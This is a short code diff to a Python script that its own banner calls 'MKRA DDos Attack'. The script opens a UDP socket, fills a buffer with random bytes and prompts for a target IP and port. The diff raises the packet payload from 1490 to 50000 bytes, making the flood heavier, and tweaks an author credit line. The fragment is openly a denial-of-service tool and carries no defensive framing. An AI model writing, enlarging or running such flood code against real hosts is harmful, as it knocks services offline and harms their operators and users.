@@ -14,7 +14,7 @@ year = now.year
 
 ##############
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
+bytes = random._urandom(50000)
 #############
 
 os.system("clear")
@@ -22,7 +22,7 @@ os.system("figlet MKRA DDos Attack")
 print()
 print("Author   : mkra")
 print("github   :https://github.com/soreungmakara2/Makra ")
-print("CSDN     : 😊😊😊😊😊😊😊😊😊😊😊")
+print("CSDN     : 😊😊😊😊😊😊😊😊😊😊😊🇰🇭")
 print()
 ip = input("IP Target : ")
 port = input("Port       : ")
